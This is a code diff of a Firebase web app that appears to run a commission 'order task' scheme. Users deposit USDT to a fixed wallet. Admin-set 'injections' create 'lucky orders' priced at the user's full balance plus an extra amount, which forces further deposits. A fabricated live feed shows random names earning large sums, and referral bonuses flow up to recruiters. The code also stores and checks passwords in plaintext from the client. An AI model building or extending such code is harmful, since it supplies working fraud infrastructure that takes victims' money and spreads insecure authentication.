@@ -864,7 +864,7 @@
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
-    import { getFirestore, collection, doc, setDoc, getDoc, getDocs, query, where, updateDoc, onSnapshot, addDoc, orderBy, increment, deleteDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
+    import { getFirestore, collection, doc, setDoc, getDoc, getDocs, query, where, updateDoc, onSnapshot, addDoc, orderBy, increment, runTransaction } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
     import { getAuth, GoogleAuthProvider, signInWithPopup, onAuthStateChanged, signOut as firebaseSignOut } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-auth.js";
 
     // ===== NEW CONFIG for tripnew-2026 =====
@@ -897,10 +897,12 @@
     let unsubRecharge = null;
     let unsubInjections = null;
     let unsubNotifications = null;
-    let unsubAccount = null; // <--- ဒါကို ထည့်ထားပါတယ်
 
     const VIP_RATES = { 1:0.005, 2:0.007, 3:0.008, 4:0.010 };
-    function getVIP(user) { if (user?.manualVIPLevel && user.manualVIPLevel > 0) return user.manualVIPLevel; return 1; }
+    function getVIP(user) {
+        if (user?.manualVIPLevel && user.manualVIPLevel > 0) return user.manualVIPLevel;
+        return 1;
+    }
     function getRate(user) { return VIP_RATES[getVIP(user)] || 0.005; }
     function getVipClass(lv) { return lv===1?'vip-1':lv===2?'vip-2':lv===3?'vip-3':'vip-4'; }
     function esc(s) { if(!s) return ''; return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]||m); }
@@ -952,23 +954,15 @@
         else { inp.type='password'; icon.classList.replace('fa-eye-slash','fa-eye'); }
     };
 
-    // ===== ACCOUNT DELETION LISTENER (Real-time) =====
-    function subscribeAccountDeletion(uid) {
-        if (unsubAccount) { unsubAccount(); unsubAccount = null; }
-        unsubAccount = onSnapshot(doc(db, "users", uid), (snap) => {
-            if (!snap.exists()) {
-                toast('Your account has been deleted by Admin.', true);
-                localStorage.removeItem('uid');
-                firebaseSignOut(auth).catch(e => console.log(e));
-                user = null;
-                showPage('landing');
-                setTimeout(() => window.location.reload(), 1500);
-            }
-        }, (error) => console.error('Account Deletion Subscription Error:', error));
-    }
+    document.getElementById('loginToggle').onclick = function() {
+        const inp = document.getElementById('loginPass');
+        const icon = this.querySelector('i');
+        if (inp.type === 'password') { inp.type='text'; icon.classList.replace('fa-eye','fa-eye-slash'); }
+        else { inp.type='password'; icon.classList.replace('fa-eye-slash','fa-eye'); }
+    };
 
-    // ===== REFERRAL BONUS (10%) =====
-    async function distributeReferral(commission) {
+    // ===== REFERRAL SYSTEM FUNCTION (10% of Commission to Superior) =====
+    async function distributeReferral(commission, customerDocId) {
         if (!user.superior) return;
         try {
             const refQuery = query(collection(db, "users"), where("username", "==", user.superior));
@@ -977,6 +971,7 @@
                 const refUser = refSnap.docs[0];
                 const bonus = commission * 0.10;
                 
+                // Update Superior's balance & referral earnings
                 await updateDoc(doc(db, "users", refUser.id), {
                     balance: increment(bonus),
                     referralEarnings: increment(bonus)
@@ -984,6 +979,18 @@
             }
         } catch (e) {
             console.error("Referral distribution error:", e);
+        }
+    }
+
+    // ===== GET IP ADDRESS FUNCTION =====
+    async function getClientIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Error fetching IP:', error);
+            return null;
         }
     }
 
@@ -1041,6 +1048,11 @@
             const snap = await getDocs(q);
             pendingInjections = [];
             snap.forEach(d => pendingInjections.push({ id: d.id, ...d.data() }));
+            if (pendingInjections.length) {
+                pendingInjections.sort((a,b) => a.taskNumber - b.taskNumber);
+                user.pendingInjections = pendingInjections;
+                await saveUser();
+            }
             return pendingInjections;
         } catch (e) {
             console.error('loadInjections error:', e);
@@ -1049,12 +1061,29 @@
     }
 
     function subscribeInjectionsRealtime(uid) {
-        if (unsubInjections) { unsubInjections(); unsubInjections = null; }
+        if (unsubInjections) {
+            unsubInjections();
+            unsubInjections = null;
+        }
         const q = query(collection(db, "injections"), where("userId", "==", uid), where("used", "==", false));
         unsubInjections = onSnapshot(q, async (snap) => {
-            pendingInjections = [];
-            snap.forEach(d => pendingInjections.push({ id: d.id, ...d.data() }));
-            if (currentSection === 'work' && user) loadNextOrder();
+            const injs = [];
+            snap.forEach(d => injs.push({ id: d.id, ...d.data() }));
+            if (injs.length > 0 && user) {
+                injs.sort((a,b) => a.taskNumber - b.taskNumber);
+                user.pendingInjections = injs;
+                pendingInjections = injs;
+                await saveUser();
+                const d = t[lang] || t.en;
+                toast(`✨ ${d.bonusOrder} ${d.injectionMsg}`);
+                if(currentSection === 'work') loadNextOrder();
+            } else if (injs.length === 0 && user) {
+                pendingInjections = [];
+                user.pendingInjections = [];
+                await saveUser();
+            }
+        }, (error) => {
+            console.error('subscribeInjectionsRealtime error:', error);
         });
     }
 
@@ -1073,8 +1102,244 @@
         await updateDoc(doc(db, "users", user.id), { lastSeen: Date.now() });
     }
 
-    // ===== DISPLAY ORDER =====
+    function startLastSeenUpdate() {
+        if (lastSeenInterval) clearInterval(lastSeenInterval);
+        lastSeenInterval = setInterval(async () => {
+            if (user) {
+                try {
+                    await updateDoc(doc(db, "users", user.id), { lastSeen: Date.now() });
+                } catch(e) { /* silent */ }
+            }
+        }, 60000);
+    }
+
+    // ===== NOTIFICATIONS =====
+    function subscribeNotificationsRealtime() {
+        if (unsubNotifications) { unsubNotifications(); unsubNotifications = null; }
+        if (!user) return;
+        const q = query(collection(db, "chatMessages"), 
+            where("from", "==", "admin"), 
+            where("to", "==", user.username),
+            where("type", "==", "notification"),
+            orderBy("id", "asc")
+        );
+        unsubNotifications = onSnapshot(q, (snap) => {
+            let newCount = 0;
+            const msgs = [];
+            snap.forEach(d => {
+                const m = d.data();
+                if (!m.read) newCount++;
+                msgs.push(m);
+            });
+            const badge = document.getElementById('notifBadge');
+            if (newCount > 0) { badge.innerText = newCount; badge.style.display = 'block'; }
+            else { badge.style.display = 'none'; }
+            window.__unreadAdminMessages = msgs.filter(m => !m.read);
+        }, (error) => console.error('subscribeNotificationsRealtime error:', error));
+    }
+
+    async function loadNotifications() {
+        if (!user) return;
+        try {
+            const q = query(collection(db, "chatMessages"), 
+                where("from", "==", "admin"), 
+                where("to", "==", user.username),
+                where("type", "==", "notification"),
+                orderBy("id", "asc")
+            );
+            const snap = await getDocs(q);
+            let newCount = 0;
+            const msgs = [];
+            snap.forEach(d => {
+                const m = d.data();
+                if (!m.read) newCount++;
+                msgs.push(m);
+            });
+            const badge = document.getElementById('notifBadge');
+            if (newCount > 0) { badge.innerText = newCount; badge.style.display = 'block'; }
+            else { badge.style.display = 'none'; }
+            window.__unreadAdminMessages = msgs.filter(m => !m.read);
+        } catch (e) { console.error('loadNotifications error:', e); }
+    }
+
+    document.getElementById('notificationBtn').onclick = async () => {
+        if (!user) return;
+        const d = t[lang] || t.en;
+        const msgs = window.__unreadAdminMessages || [];
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        let html = `<div class="modal-box"><div class="modal-title"><i class="fas fa-bell" style="color:var(--gold);"></i> Admin Notifications</div>`;
+        if (msgs.length === 0) html += `<p style="color:var(--muted);text-align:center;padding:12px;">No new messages</p>`;
+        else {
+            msgs.sort((a,b) => a.id - b.id);
+            msgs.forEach(m => {
+                const text = m.text || '';
+                const parts = text.split('\n\n');
+                const title = parts.length > 1 ? parts[0].replace('[NOTIFICATION] ', '') : 'Notification';
+                const body = parts.length > 1 ? parts.slice(1).join('\n\n') : text.replace('[NOTIFICATION] ', '');
+                html += `<div class="chat-msg received" style="max-width:100%;margin-bottom:6px;background:#e8f5e9;border-color:var(--secondary);">
+                    <div><strong style="color:var(--secondary);">${esc(title)}</strong></div>
+                    <div style="white-space:pre-wrap;">${esc(body)}</div>
+                    <div class="time">${m.time ? new Date(m.time).toLocaleString([], { hour12: false }) : ''}</div>
+                </div>`;
+            });
+        }
+        html += `<button class="btn-primary" id="notifCloseBtn">${d.close}</button></div>`;
+        modal.innerHTML = html;
+        document.body.appendChild(modal);
+        modal.querySelector('#notifCloseBtn').onclick = async () => {
+            document.body.removeChild(modal);
+            if (msgs.length > 0) {
+                for (let m of msgs) {
+                    const snap = await getDocs(query(collection(db, "chatMessages"), where("id", "==", m.id)));
+                    snap.forEach(d => updateDoc(doc(db, "chatMessages", d.id), { read: true }));
+                }
+                document.getElementById('notifBadge').style.display = 'none';
+                window.__unreadAdminMessages = [];
+            }
+        };
+    };
+
+    // ===== CHAT =====
+    function subscribeChatRealtime() {
+        if (unsubChat) { unsubChat(); unsubChat = null; }
+        const q = query(collection(db, "chatMessages"), orderBy("id", "asc"));
+        unsubChat = onSnapshot(q, (snap) => {
+            const isServicePage = document.getElementById('pageService').classList.contains('active-page');
+            if (!isServicePage) return;
+            const container = document.getElementById('chatMessages');
+            if (!container || !user) return;
+            const msgs = [];
+            snap.forEach(d => {
+                const m = d.data();
+                if (m.type !== 'notification' && ((m.from === user.username && m.to === 'admin') || (m.from === 'admin' && m.to === user.username))) {
+                    msgs.push(m);
+                }
+            });
+            msgs.sort((a,b) => a.id - b.id);
+            container.innerHTML = msgs.length ? msgs.map(m => {
+                const isSent = m.from === user.username;
+                const msgTime = m.time ? new Date(m.time).toLocaleString([], { hour12: false }) : '';
+                return `<div class="chat-msg ${isSent ? 'sent' : 'received'}"><div>${esc(m.text||'')}</div>${m.image ? `<img src="${m.image}" onclick="window.open(this.src)">` : ''}<div class="time">${msgTime}</div></div>`;
+            }).join('') : '<div style="text-align:center;padding:10px;color:var(--muted);">No messages yet</div>';
+            container.scrollTop = container.scrollHeight;
+        }, (error) => console.error('subscribeChatRealtime error:', error));
+    }
+
+    async function sendChat(text, img=null) {
+        if (!user) return;
+        await setDoc(doc(db, "chatMessages", (Date.now()+Math.random()).toString()), {
+            id: Date.now()+Math.random(), from: user.username, to: 'admin', text: text||'', image: img,
+            time: new Date().toISOString(), read: false, type: 'message'
+        });
+    }
+
+    // ===== RECHARGE =====
+    async function loadRechargeStatus(uid) {
+        try {
+            const q = query(collection(db, "rechargeRequests"), where("userId", "==", uid));
+            const snap = await getDocs(q);
+            snap.forEach(async (docSnap) => {
+                const data = docSnap.data();
+                if (data.status === 'approved' && !data.balanceAdded) {
+                    if (user) { user.balance += data.amount; await saveUser(); updateUI(); toast(`✅ Recharge of $${data.amount} approved!`); }
+                    await updateDoc(doc(db, "rechargeRequests", docSnap.id), { balanceAdded: true });
+                }
+            });
+        } catch (e) { console.error('loadRechargeStatus error:', e); }
+    }
+
+    function subscribeRechargeRealtime(uid) {
+        if (unsubRecharge) { unsubRecharge(); unsubRecharge = null; }
+        const q = query(collection(db, "rechargeRequests"), where("userId", "==", uid));
+        unsubRecharge = onSnapshot(q, async (snap) => {
+            snap.forEach(async (docSnap) => {
+                const data = docSnap.data();
+                if (data.status === 'approved' && !data.balanceAdded) {
+                    if (user) { user.balance += data.amount; await saveUser(); updateUI(); toast(`✅ Recharge of $${data.amount} approved!`); }
+                    await updateDoc(doc(db, "rechargeRequests", docSnap.id), { balanceAdded: true });
+                }
+            });
+        }, (error) => console.error('subscribeRechargeRealtime error:', error));
+    }
+
+    function showRechargeModal() {
+        const d = t[lang] || t.en;
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.innerHTML = `
+            <div class="modal-box">
+                <div class="modal-title"><i class="fas fa-plus-circle"></i> ${d.rechargeText}</div>
+                <div class="wallet-box">
+                    <div><div style="color:var(--muted);font-size:11px;">${d.walletAddr}</div><div class="addr" id="walletAddrDisplay">TCFBPV1hM4KicpoyVkF2xahT7osrVrYb9hF</div></div>
+                    <button class="copy-btn" id="copyWalletBtn">${d.copy}</button>
+                </div>
+                <input type="number" class="input-glass" id="rechargeAmt" placeholder="Amount (USDT)" value="100">
+                <div class="upload-area" id="receiptArea">${d.uploadReceipt}<input type="file" id="receiptInput" accept="image/*" style="display:none;"></div>
+                <div id="receiptPreview"></div>
+                <div id="rechargeMsg"></div>
+                <button class="btn-primary" id="rechargeSubmitBtn">${d.submit}</button>
+                <button class="btn-primary btn-outline" id="rechargeCancelBtn" style="margin-top:8px;">${d.cancel}</button>
+            </div>
+        `;
+        document.body.appendChild(modal);
+        modal.querySelector("#copyWalletBtn").onclick = () => { navigator.clipboard.writeText('TCFBPV1hM4KicpoyVkF2xahT7osrVrYb9hF'); toast("Copied!"); };
+        let receiptData = null;
+        modal.querySelector("#receiptArea").onclick = () => modal.querySelector("#receiptInput").click();
+        modal.querySelector("#receiptInput").onchange = async (e) => {
+            if (e.target.files[0]) {
+                receiptData = await compressImage(e.target.files[0], 600, 600, 0.6);
+                modal.querySelector("#receiptPreview").innerHTML = `<img src="${receiptData}" style="max-width:100%;max-height:200px;border-radius:10px;border:2px solid var(--secondary);">`;
+            }
+        };
+        modal.querySelector("#rechargeSubmitBtn").onclick = async () => {
+            const amt = parseFloat(modal.querySelector("#rechargeAmt").value);
+            if (isNaN(amt) || amt < 1) { modal.querySelector("#rechargeMsg").innerHTML = `<span style="color:#dc2626;">${d.enterAmount}</span>`; return; }
+            if (!receiptData) { modal.querySelector("#rechargeMsg").innerHTML = `<span style="color:#dc2626;">${d.uploadReceipt}</span>`; return; }
+            this.disabled = true;
+            try {
+                const reqId = Date.now().toString();
+                await setDoc(doc(db, "rechargeRequests", reqId), { id: reqId, userId: user.id, userName: user.username, amount: amt, receiptImage: receiptData, status: 'pending', timestamp: new Date().toISOString() });
+                subscribeRechargeRealtime(user.id);
+                setTimeout(() => { document.body.removeChild(modal); toast(d.rechargeWaiting); }, 2500);
+            } catch (e) { modal.querySelector("#rechargeMsg").innerHTML = `<span style="color:#dc2626;">Error: ${e.message}</span>`; this.disabled = false; }
+        };
+        modal.querySelector("#rechargeCancelBtn").onclick = () => document.body.removeChild(modal);
+    }
+
+    // ===== WITHDRAW =====
+    function showWithdrawModal() {
+        const d = t[lang] || t.en;
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.innerHTML = `
+            <div class="modal-box">
+                <div class="modal-title"><i class="fas fa-minus-circle"></i> ${d.withdrawText}</div>
+                <input type="text" class="input-glass" id="withdrawWallet" placeholder="USDT TRC20 Address">
+                <input type="number" class="input-glass" id="withdrawAmt" placeholder="Amount" step="0.01">
+                <button class="btn-primary" id="withdrawSubmitBtn">${d.submit}</button>
+                <button class="btn-primary btn-outline" id="withdrawCancelBtn" style="margin-top:8px;">${d.cancel}</button>
+                <div id="withdrawMsg" style="text-align:center;margin-top:6px;font-size:13px;"></div>
+            </div>
+        `;
+        document.body.appendChild(modal);
+        modal.querySelector("#withdrawSubmitBtn").onclick = async () => {
+            const wallet = modal.querySelector("#withdrawWallet").value.trim();
+            const amt = parseFloat(modal.querySelector("#withdrawAmt").value);
+            if (!wallet) { modal.querySelector("#withdrawMsg").innerHTML = '<span style="color:#dc2626;">Enter wallet address.</span>'; return; }
+            if (isNaN(amt) || amt < 1) { modal.querySelector("#withdrawMsg").innerHTML = '<span style="color:#dc2626;">Enter valid amount.</span>'; return; }
+            if (amt > (user.balance||0)) { modal.querySelector("#withdrawMsg").innerHTML = '<span style="color:#dc2626;">Insufficient balance.</span>'; return; }
+            user.balance -= amt;
+            await saveUser(); updateUI();
+            await setDoc(doc(db, "withdrawRequests", Date.now().toString()), { id: Date.now().toString(), userId: user.id, userName: user.username, amount: amt, walletAddress: wallet, status: 'pending', timestamp: new Date().toISOString() });
+            document.body.removeChild(modal); toast("Withdraw submitted!");
+        };
+        modal.querySelector("#withdrawCancelBtn").onclick = () => document.body.removeChild(modal);
+    }
+
+    // ===== ORDER DISPLAY =====
     async function displayOrder(o, isLucky) {
+        const d = t[lang] || t.en;
         const container = document.getElementById('orderDisplay');
         if (!container) return;
         const after = (user.balance||0) + o.netCommission;
@@ -1082,7 +1347,14 @@
 
         let luckyHtml = '';
         if (isLucky) {
-            luckyHtml = `<div class="lucky-glow"></div><div class="lucky-badge"><i class="fas fa-gift"></i> LUCKY ORDER!</div><div style="text-align:center;padding:10px;background:rgba(212,175,55,0.1);border-radius:12px;margin-bottom:12px;"><h2 style="color:var(--gold);font-size:24px;font-weight:800;">🎉 Congratulations!</h2><p style="color:var(--text-secondary);font-size:14px;">You've been selected for a special task with boosted rewards!</p></div>`;
+            luckyHtml = `
+                <div class="lucky-glow"></div>
+                <div class="lucky-badge"><i class="fas fa-gift"></i> ${d.bonusOrder}</div>
+                <div style="text-align:center;padding:10px;background:rgba(212,175,55,0.1);border-radius:12px;margin-bottom:12px;">
+                    <h2 style="color:var(--gold);font-size:24px;font-weight:800;">🎉 Congratulations!</h2>
+                    <p style="color:var(--text-secondary);font-size:14px;">${d.injectionMsg}</p>
+                </div>
+            `;
         }
 
         container.innerHTML = `
@@ -1091,71 +1363,103 @@
                 <div class="order-img"><i class="fas fa-box" style="font-size:32px;color:var(--secondary);"></i></div>
                 <h3 style="color:var(--primary);font-size:17px;">${o.name}</h3>
                 <div style="font-size:12px;color:var(--muted);">#${o.orderNumber}</div>
-                <div class="flex" style="font-size:13px;"><span style="color:var(--muted);">Order Amount</span><span style="color:var(--secondary);font-weight:700;">$ ${o.amount.toFixed(2)}</span></div>
+                <div class="flex" style="font-size:13px;"><span style="color:var(--muted);">${d.orderAmount}</span><span style="color:var(--secondary);font-weight:700;">$ ${o.amount.toFixed(2)}</span></div>
                 <div class="flex" style="font-size:13px;"><span style="color:var(--muted);">Commission</span><span class="text-gold">+ $ ${o.netCommission.toFixed(4)}</span></div>
-                <div class="flex" style="margin-top:8px;padding-top:8px;border-top:1px solid var(--border);font-size:13px;"><span style="color:var(--muted);">After Balance</span><strong style="color:var(--secondary);font-size:16px;">$ ${after.toFixed(2)}</strong></div>
-                ${!insufficient ? `<button class="btn-primary" id="submitOrderBtn" style="margin-top:10px;">Submit & Complete</button>` : `<div style="margin-top:10px;color:red;">Insufficient Balance.</div>`}
+                <div class="flex" style="margin-top:8px;padding-top:8px;border-top:1px solid var(--border);font-size:13px;">
+                    <span style="color:var(--muted);">${d.afterBalance}</span>
+                    <strong style="color:var(--secondary);font-size:16px;">$ ${after.toFixed(2)}</strong>
+                </div>
+                ${!insufficient ? `
+                    <div style="margin-top:10px;">
+                        <div style="color:var(--secondary);font-size:12px;">${d.serviceQuality}</div>
+                        <div class="stars" data-cat="service"><i data-v="1" class="far fa-star"></i><i data-v="2" class="far fa-star"></i><i data-v="3" class="far fa-star"></i><i data-v="4" class="far fa-star"></i><i data-v="5" class="far fa-star"></i></div>
+                    </div>
+                    <div style="margin-top:6px;">
+                        <div style="color:var(--secondary);font-size:12px;">${d.productQuality}</div>
+                        <div class="stars" data-cat="quality"><i data-v="1" class="far fa-star"></i><i data-v="2" class="far fa-star"></i><i data-v="3" class="far fa-star"></i><i data-v="4" class="far fa-star"></i><i data-v="5" class="far fa-star"></i></div>
+                    </div>
+                    <div style="margin-top:6px;">
+                        <div style="color:var(--secondary);font-size:12px;">${d.salesExperience}</div>
+                        <div class="stars" data-cat="sales"><i data-v="1" class="far fa-star"></i><i data-v="2" class="far fa-star"></i><i data-v="3" class="far fa-star"></i><i data-v="4" class="far fa-star"></i><i data-v="5" class="far fa-star"></i></div>
+                    </div>
+                    <button class="btn-primary" id="submitOrderBtn" style="margin-top:10px;font-size:14px;">${d.submitComplete}</button>
+                ` : `<div style="margin-top:10px;padding:12px;background:rgba(220,38,38,0.04);border-radius:12px;border:1px solid rgba(220,38,38,0.08);"><strong style="color:#dc2626;font-size:14px;">${d.insufficient}</strong></div>`}
             </div>
         `;
-
         order = o;
-        const submitBtn = document.getElementById('submitOrderBtn');
-        if (submitBtn) submitBtn.onclick = async () => {
-            submitBtn.disabled = true; submitBtn.innerHTML = 'Processing...';
-            try {
-                const profit = order.netCommission;
-                
-                await updateDoc(doc(db, "users", user.id), {
-                    balance: increment(profit),
-                    todayEarnings: increment(profit),
-                    totalCommission: increment(profit),
-                    "tasks.completed": increment(1)
-                });
-                
-                await saveOrder(user.id, { name: order.name, amount: order.amount, profit: profit, isLucky: isLucky, timestamp: new Date().toISOString() });
-                
-                // Referral Bonus (10%)
-                await distributeReferral(profit);
+        ratings = { service:0, quality:0, sales:0 };
 
-                user.currentOrderObj = null; await saveUser(); order = null;
-                toast(`✅ +$${profit.toFixed(4)}`); updateUI(); loadNextOrder();
-            } catch(e) { console.error(e); toast("Error: " + e.message, true); }
-            submitBtn.disabled = false; submitBtn.innerHTML = 'Submit & Complete';
-        };
+        if (!insufficient) {
+            container.querySelectorAll('.stars').forEach(el => {
+                const cat = el.dataset.cat;
+                const stars = el.querySelectorAll('i');
+                stars.forEach(s => {
+                    s.onclick = function() {
+                        const val = parseInt(this.dataset.v);
+                        ratings[cat] = val;
+                        stars.forEach((st, i) => { st.className = i < val ? 'fas fa-star active' : 'far fa-star'; });
+                    };
+                });
+            });
+            const submitBtn = document.getElementById('submitOrderBtn');
+            if (submitBtn) submitBtn.onclick = async function() {
+                if (this.disabled) return;
+                if (ratings.service === 0 || ratings.quality === 0 || ratings.sales === 0) { toast("Please provide all ratings.", true); return; }
+                this.disabled = true; this.innerHTML = `<i class="fas fa-spinner fa-pulse"></i> ${d.processing}`;
+                try {
+                    const profit = order.netCommission;
+                    if (!user.tasks) user.tasks = { completed:0, total:0 };
+                    user.balance += profit;
+                    user.todayEarnings += profit;
+                    user.totalCommission += profit;
+                    user.tasks.completed += 1;
+                    order.status = 'completed'; order.ratings = { ...ratings }; order.date = new Date().toLocaleString(); order.profit = profit;
+                    await saveOrder(user.id, order);
+                    user.currentOrderObj = null; await saveUser(); order = null;
+                    
+                    // ===== REFERRAL BONUS (10% to Superior) =====
+                    await distributeReferral(profit, user.id);
+
+                    updateUI(); toast(`✅ +$${profit.toFixed(4)}`);
+                    loadNextOrder();
+                } catch(e) { console.error(e); toast("Error: "+e.message, true); }
+                this.disabled = false; this.innerHTML = d.submitComplete;
+            };
+        }
     }
 
-    // ===== LOAD NEXT ORDER =====
     async function loadNextOrder() {
         const limit = user.tasks?.total || 0;
         const done = user.tasks?.completed || 0;
         if (done >= limit && limit > 0) { document.getElementById('orderDisplay').innerHTML = ''; return; }
-        
         const settings = await getDoc(doc(db, "systemSettings", "main"));
         const minBal = settings.exists() ? (settings.data().minBalanceForOrder || 10) : 10;
-        if ((user.balance||0) < minBal) { document.getElementById('orderDisplay').innerHTML = '<div class="card">Insufficient balance.</div>'; return; }
+        if ((user.balance||0) < minBal) { document.getElementById('orderDisplay').innerHTML = `<div class="card" style="text-align:center;padding:16px;"><span style="color:#f59e0b;">⚠️ ${t[lang].insufficient}</span></div>`; return; }
 
         const nextTask = (user.tasks?.completed||0) + 1;
-        let isLucky = false, injection = null;
-        
+        let isLucky = false;
+        let injection = null;
+
         if (pendingInjections.length > 0) {
             injection = pendingInjections.find(i => i.taskNumber === nextTask);
             if (injection) {
                 isLucky = true;
                 await markUsed(injection.id);
                 pendingInjections = pendingInjections.filter(i => i.id !== injection.id);
+                user.pendingInjections = pendingInjections;
                 await saveUser();
             }
         }
 
         const templates = await loadCustomOrders();
-        const tpl = templates.length ? templates[Math.floor(Math.random()*templates.length)] : { name:'Premium Task', price:10 };
+        const tpl = templates.length ? templates[Math.floor(Math.random()*templates.length)] : { name:'Premium Order', price:10 };
         const balance = user.balance||0;
         const rate = getRate(user);
         let amount, net;
 
         if (isLucky) {
             amount = balance + (injection.extraAmount || 0);
-            net = injection.commission > 0 ? injection.commission : amount * (injection.commissionRate/100);
+            net = injection.commission > 0 ? injection.commission : (injection.commissionRate > 0 ? amount * (injection.commissionRate/100) : amount * rate);
         } else {
             const pct = 0.53 + Math.random() * 0.26;
             amount = parseFloat((balance * pct).toFixed(2));
@@ -1163,7 +1467,14 @@
             net = gross - (gross * 0.01);
         }
 
-        const newOrder = { id: Date.now(), name: isLucky ? 'Lucky Premium Task' : tpl.name, amount: amount, netCommission: net, rate: isLucky ? injection.commissionRate : (rate * 100), orderNumber: 'ORD'+Math.floor(Math.random()*1e9), isLucky: isLucky };
+        const newOrder = {
+            id: Date.now(),
+            name: isLucky ? 'Lucky Premium Task' : tpl.name,
+            amount: amount, netCommission: net,
+            rate: isLucky ? injection.commissionRate : (rate * 100),
+            orderNumber: 'ORD'+Math.floor(Math.random()*1e9),
+            isLucky: isLucky
+        };
         user.currentOrderObj = newOrder; await saveUser();
         displayOrder(newOrder, isLucky);
     }
@@ -1181,6 +1492,7 @@
     // ===== UPDATE UI =====
     async function updateUI() {
         if (!user) return;
+        const d = t[lang] || t.en;
         const orders = await getOrders(user.id);
         const balance = user.balance||0;
         const vip = getVIP(user);
@@ -1212,78 +1524,79 @@
         const completed = orders.filter(o => o.status === 'completed');
         document.getElementById('ordersList').innerHTML = completed.length ? completed.slice(0, 20).map(o => `
             <div class="card">
-                <div class="flex"><strong style="font-size:14px;">${o.name}</strong><span style="color:var(--secondary);font-size:11px;">Completed</span></div>
+                <div class="flex"><strong style="font-size:14px;">${o.name}</strong><span style="color:var(--secondary);font-size:11px;">${d.completed}</span></div>
                 <div style="font-size:13px;">Amount: $ ${o.amount?.toFixed(2)||0} | Profit: +$ ${(o.profit||0).toFixed(4)}</div>
                 <div style="font-size:11px;color:var(--muted);">${o.date||new Date(o.timestamp).toLocaleString()}</div>
             </div>
-        `).join('') : '<div class="card"><div style="color:var(--muted);text-align:center;padding:12px;">No records.</div></div>';
+        `).join('') : `<div class="card"><div style="color:var(--muted);text-align:center;padding:12px;">${d.noRecords}</div></div>`;
+    }
+
+    // ===== LIVE FEED =====
+    const names = ["James","Emma","Liam","Olivia","Noah","Ava","William","Sophia","Somchai","Somying","Wichai","Napa","Carlos","Maria","Olga","Dmitri"];
+    function randName() { return names[Math.floor(Math.random()*names.length)]; }
+    function randComm() { return Math.floor(Math.random()*(23513-800+1)+800); }
+    function startFeed() {
+        if (feedInterval) clearInterval(feedInterval);
+        const container = document.getElementById('feedList');
+        if (!container) return;
+        function add() { const item = document.createElement('div'); item.className = 'feed-item'; item.innerHTML = `<i class="fas fa-trophy" style="color:var(--secondary);"></i> <strong>${randName()}</strong> earned <span style="color:var(--secondary);">+$ ${randComm().toLocaleString()}</span>`; container.prepend(item); if (container.children.length > 5) container.removeChild(container.lastChild); }
+        for (let i=0; i<2; i++) add();
+        feedInterval = setInterval(add, 8000);
     }
 
     // ===== NAVIGATION =====
     let currentSection = 'home';
-    const pages = ['landing','login','register','home','work','orders','profile','service'];
+    const pages = {
+        landing: document.getElementById('pageLanding'),
+        login: document.getElementById('pageLogin'),
+        register: document.getElementById('pageRegister'),
+        home: document.getElementById('pageHome'),
+        work: document.getElementById('pageWork'),
+        orders: document.getElementById('pageOrders'),
+        profile: document.getElementById('pageProfile'),
+        service: document.getElementById('pageService')
+    };
+    const bottomNav = document.getElementById('bottomNav');
+
     function showPage(name) {
-        pages.forEach(p => document.getElementById('page'+p.charAt(0).toUpperCase()+p.slice(1)).classList.remove('active-page'));
-        document.getElementById('page'+name.charAt(0).toUpperCase()+name.slice(1)).classList.add('active-page');
+        if (!user && !['landing','login','register'].includes(name)) name = 'landing';
+        Object.keys(pages).forEach(k => pages[k].classList.remove('active-page'));
+        if (pages[name]) pages[name].classList.add('active-page');
         currentSection = name;
-        if(['home','work','orders','profile','service'].includes(name)){ document.getElementById('bottomNav').classList.remove('hidden-nav'); document.querySelectorAll('.nav-item').forEach(el => el.classList.toggle('active', el.dataset.page === name)); } else document.getElementById('bottomNav').classList.add('hidden-nav');
-
-        if(name === 'work' && user){ subscribeInjectionsRealtime(user.id); refreshWork(); }
-        if(name === 'home' && user) updateUI();
-    }
-    document.querySelectorAll('.nav-item').forEach(el => el.onclick = () => showPage(el.dataset.page));
-
-    // ===== LOGIN =====
-    document.getElementById('doLoginBtn').onclick = async () => {
-        const u = document.getElementById('loginUsername').value.trim();
-        const p = document.getElementById('loginPass').value;
-        if(!u || !p) return toast('Enter username and password', true);
-        const q = query(collection(db,"users"), where("username","==",u), where("password","==",p));
-        const snap = await getDocs(q);
-        if(snap.empty) return toast('Invalid credentials', true);
-        if(snap.docs[0].data().disabled) return toast('Account disabled', true);
-        await loadUserData(snap.docs[0].id);
-        await loadInjections(user.id);
-        await saveUser();
-        subscribeAccountDeletion(user.id);
-        updateUI(); showPage('home');
-    };
-
-    // ===== REGISTER (With Referral) =====
-    document.getElementById('doRegisterBtn').onclick = async () => {
-        const username = document.getElementById('regUsername').value.trim();
-        const email = document.getElementById('regEmail').value.trim();
-        const pass = document.getElementById('regPass').value;
-        const withdraw = document.getElementById('regWithdraw').value;
-        const invite = document.getElementById('regInvite').value.trim();
-        if(!username || !email || !pass || !withdraw) return toast('All fields required', true);
-        const existQ = query(collection(db,"users"), where("username","==",username));
-        const existSnap = await getDocs(existQ);
-        if(!existSnap.empty) return toast('Username exists', true);
+        if (['landing','login','register'].includes(name)) bottomNav.classList.add('hidden-nav');
+        else bottomNav.classList.remove('hidden-nav');
+        if (!['landing','login','register'].includes(name)) localStorage.setItem('lastPage', name);
         
-        let superior = null;
-        if(invite){ 
-            const refQ = query(collection(db,"users"), where("invitationCode","==",invite)); 
-            const refSnap = await getDocs(refQ); 
-            if(refSnap.empty) return toast('Invalid invitation code', true); 
-            superior = refSnap.docs[0].data().username; 
-        }
-
-        user = {
-            id: Date.now().toString(), username, email, password: pass, withdrawPassword: withdraw,
-            balance: 0, invitationCode: 'LXC'+Math.random().toString(36).substring(2,8).toUpperCase(),
-            superior: superior, referralEarnings: 0, regTime: new Date().toISOString(),
-            tasks: { completed:0, total:0 }, todayEarnings: 0, totalCommission: 0,
-            creditScore: 100, disabled: false, walletAddress: null, role: 'customer', lastSeen: Date.now()
